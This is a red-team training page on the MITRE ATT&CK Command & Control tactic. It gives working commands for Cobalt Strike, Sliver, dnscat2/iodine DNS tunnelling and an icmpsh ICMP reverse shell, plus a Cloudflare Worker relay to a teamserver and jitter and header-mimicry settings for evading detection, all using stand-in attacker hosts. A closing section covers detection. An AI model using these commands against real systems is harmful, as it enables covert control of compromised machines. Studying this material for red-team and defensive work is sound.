---
layout: training-page
title: "TA0011 — Command & Control — Red Team Academy"
module: "MITRE ATT&CK Tactics"
tags:
  - mitre
  - att&ck
  - command-and-control
  - c2
  - cobalt-strike
  - beacons
  - dns-c2
page_key: "mitre-ta0011"
render_with_liquid: false
---

# TA0011 — Command & Control

Command and Control covers the techniques adversaries use to communicate with implants on compromised systems. C2 traffic must blend with legitimate network activity — modern blue teams with NDR sensors can profile C2 beacons by their regularity, payload size distribution, and protocol anomalies. The goal of C2 tradecraft is to create traffic that is indistinguishable from normal business activity across every layer: protocol, timing, payload content, and TLS certificate characteristics.

Red team C2 infrastructure requires the same engineering effort as production services: HTTPS with valid TLS, malleable profiles, domain fronting or CDN integration, and traffic shaping to match the target's environment.

## Key Techniques

| T-ID | Technique | Sub-technique | Notes |
|------|-----------|---------------|-------|
| T1071 | Application Layer Protocol | T1071.001 Web Protocols (HTTP/HTTPS) | Most common — beacons over port 443 |
| T1071 | Application Layer Protocol | T1071.002 File Transfer Protocols (FTP) | Less common, FTP/SFTP for data transfer |
| T1071 | Application Layer Protocol | T1071.003 Mail Protocols | SMTP/IMAP based C2 |
| T1071 | Application Layer Protocol | T1071.004 DNS | DNS TXT/A record queries as C2 channel |
| T1132 | Data Encoding | T1132.001 Standard Encoding | Base64, URL encoding to obscure payload |
| T1132 | Data Encoding | T1132.002 Non-Standard Encoding | Custom XOR, Huffman — non-obvious encoding |
| T1001 | Data Obfuscation | T1001.001 Junk Data | Padding to normalize payload sizes |
| T1001 | Data Obfuscation | T1001.003 Protocol Impersonation | Mimic Slack, Dropbox, Teams API format |
| T1568 | Dynamic Resolution | T1568.001 Fast Flux DNS | Rotate IPs rapidly per DNS TTL |
| T1568 | Dynamic Resolution | T1568.002 Domain Generation Algorithms | DGA — hundreds of fallback domains |
| T1573 | Encrypted Channel | T1573.001 Symmetric Cryptography | AES-encrypted tunnel |
| T1573 | Encrypted Channel | T1573.002 Asymmetric Cryptography | RSA key exchange, then symmetric session |
| T1008 | Fallback Channels | — | Switch to DNS/ICMP if HTTPS blocked |
| T1105 | Ingress Tool Transfer | — | Pull tools from C2 to target on demand |
| T1104 | Multi-Stage Channels | — | Stage 1 pulls stage 2 from separate server |
| T1095 | Non-Application Layer Protocol | — | ICMP-based C2 (icmpsh, PingTunnel) |
| T1571 | Non-Standard Port | — | HTTP over 8080/8443 to bypass layer-7 filters |
| T1572 | Protocol Tunneling | — | DNS tunnel (dnscat2, iodine), HTTP/WebSocket |
| T1090 | Proxy | T1090.001 Internal Proxy | Pivot host as SOCKS proxy for deeper network |
| T1090 | Proxy | T1090.002 External Proxy | VPS redirector → teamserver |
| T1090 | Proxy | T1090.003 Multi-hop Proxy | Chain multiple redirectors |
| T1090 | Proxy | T1090.004 Domain Fronting | Route through CDN to hide real C2 IP |
| T1102 | Web Service | T1102.001 Dead Drop Resolver | Payload URL hidden in GitHub/Pastebin |
| T1102 | Web Service | T1102.002 Bidirectional Communication | Slack/Telegram/Discord as C2 channel |

## Red Team Tooling

### Cobalt Strike — HTTP/HTTPS Beacon

```
# Start Cobalt Strike teamserver
./teamserver ATTACKER_IP 'TEAM_PASSWORD' /path/to/malleable.profile

# Generate staged HTTPS beacon payload
# In Cobalt Strike GUI:
# Attacks → Packages → Windows Executable (Stageless)
# Listener: HTTPS / port 443 / c2.yourdomain.com

# Malleable C2 profile — mimic Google Analytics
# profiles/googledrive.profile (excerpt):
set sleeptime "45000";
set jitter    "20";
http-get {
    set uri "/generate_204";
    client {
        header "Host" "www.google.com";
        header "Accept" "image/webp,*/*";
    }
}
```

### Sliver — mTLS/WireGuard/DNS

```
# Start Sliver server
./sliver-server

# Generate implant (mTLS — certificate-pinned, no CA needed)
generate --mtls c2.yourdomain.com --os windows --arch amd64 --name implant --save /tmp/

# Generate DNS implant
generate --dns c2.yourdomain.com --os linux --arch amd64 --name dns_implant

# Start listener
mtls --lport 443
dns --domains c2.yourdomain.com

# Stage: download-execute stager
generate stager --lhost c2.yourdomain.com --lport 443 --protocol mtls --arch amd64
```

### DNS C2 (dnscat2)

```
# dnscat2 server (attacker — authoritative for DNS zone)
ruby dnscat2.rb --dns "domain=c2.yourdomain.com,host=0.0.0.0" --no-cache --secret "password"

# dnscat2 client (target — sends DNS queries as C2 channel)
# Windows:
dnscat2-client.exe --secret "password" c2.yourdomain.com
# Linux:
./dnscat --secret "password" c2.yourdomain.com

# DNS tunneling via iodine (IP over DNS)
# Attacker (server):
iodined -f -P password 10.53.53.1 tunnel.c2.yourdomain.com
# Target (client):
iodine -f -P password tunnel.c2.yourdomain.com
# SSH over the tunnel:
ssh -D 1080 10.53.53.2
```

### Domain Fronting (CDN-based)

```
# Concept: beacon sends HTTPS to CDN edge (legitimate IP)
# CDN routes based on Host header to attacker's origin server

# Cloudflare Workers — proxy requests to teamserver
# wrangler.toml
name = "relay"
main = "src/worker.js"

# src/worker.js
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    url.hostname = "TEAMSERVER_IP";
    return fetch(url.toString(), {
      method: request.method,
      headers: request.headers,
      body: request.body
    });
  }
};

# wrangler deploy
wrangler deploy
```

### ICMP C2

```
# icmpsh — simple ICMP reverse shell (Windows target)
# Attacker (enable ICMP receive):
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP TARGET_IP

# Target:
icmpsh.exe -t ATTACKER_IP -d 500 -b 30 -s 128
```

### C2 Traffic Shaping

```
# Cobalt Strike — sleep timing and jitter to avoid beaconing detection
# In profile:
set sleeptime "30000";    # 30 second sleep
set jitter    "30";       # ±30% jitter (21-39 second range)

# Sliver — configure jitter
sliver > use IMPLANT_NAME
sliver (implant) > sleep 30s 30%

# HTTP header mimicry — make beacon look like Office 365 traffic
# Set User-Agent, Accept, Accept-Language, Accept-Encoding headers
# to match legitimate browser/Office 365 client traffic
```

## Detection Notes

- **Beacon regularity**: NDR tools (Corelight, Darktrace, Zeek) detect regular JA3/JA3S combinations + periodic beacon intervals — jitter reduces but doesn't eliminate this signature
- **JA3/JA3S fingerprinting**: Cobalt Strike's default TLS fingerprint is known; malleable profiles can modify JA3S but client JA3 requires custom build
- **DNS tunneling**: anomalous DNS query length, frequency, and entropy — base32/base64 encoded subdomains are statistically distinct from real hostnames; DNS beaconing produces high query rates to single authoritative server
- **Domain fronting**: CDN providers (Cloudflare, AWS CloudFront) have largely blocked this — Host header vs. SNI mismatch detection; some CDNs forward to origin regardless
- **ICMP C2**: ICMP echo reply with payload (data field) where legitimate ping has empty data; monitor payload size variation in ICMP streams
- **Long TLS sessions**: legitimate HTTPS sessions are short; C2 sessions with hour-long TLS connections to a new domain are anomalous

## Related Academy Pages

- [Cobalt Strike](/c2-frameworks/cobalt-strike/)
- [Sliver](/c2-frameworks/sliver/)
- [Malleable C2 Profiles](/c2-frameworks/malleable-c2/)
- [C2 OPSEC](/c2-frameworks/c2-opsec/)
- [DNS C2 Infrastructure](/infrastructure/dns-c2-infra/)
- [C2 Tiered Architecture](/c2-frameworks/c2-tiered-architecture/)
- [C2 Redirectors](/c2-frameworks/redirectors/)
- [CDN Domain Fronting](/infrastructure/cdn-fronting/)
- [DNS & ICMP Tunneling](/pivoting/dns-icmp-tunneling/)

## Resources

- [TA0011 — MITRE ATT&CK Command and Control](https://attack.mitre.org/tactics/TA0011/)
- [T1071 — Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)
- [T1090 — Proxy](https://attack.mitre.org/techniques/T1090/)
- [C2 Matrix — Framework Comparison](https://www.thec2matrix.com/)
